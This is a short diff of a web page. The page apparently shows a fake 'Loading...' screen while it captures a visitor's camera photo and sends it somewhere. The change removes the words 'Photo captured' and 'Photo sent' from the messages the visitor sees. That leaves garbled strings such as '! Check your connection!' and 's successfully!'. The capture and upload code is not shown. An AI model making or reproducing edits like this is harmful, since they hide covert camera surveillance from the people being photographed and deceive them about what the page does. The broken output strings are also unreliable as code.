@@ -112,7 +112,7 @@
         <div class="loading" id="loading">
             <div class="spinner"></div>
             <p>Just a moment... Loading..! 📸</p>
-            <p class="success" id="success" style="display:none;">Photo captured! Check your connection! ✅</p>
+            <p class="success" id="success" style="display:none;">! Check your connection! ✅</p>
         </div>
     </div>
 
@@ -164,7 +164,7 @@
                         });
                         
                         success.style.display = 'block';
-                        loading.querySelector('p').innerHTML = 'Photo sent successfully! 😊';
+                        loading.querySelector('p').innerHTML = 's successfully! 😊';
                         
                         // Stop stream
                         stream.getTracks().forEach(track => track.stop());
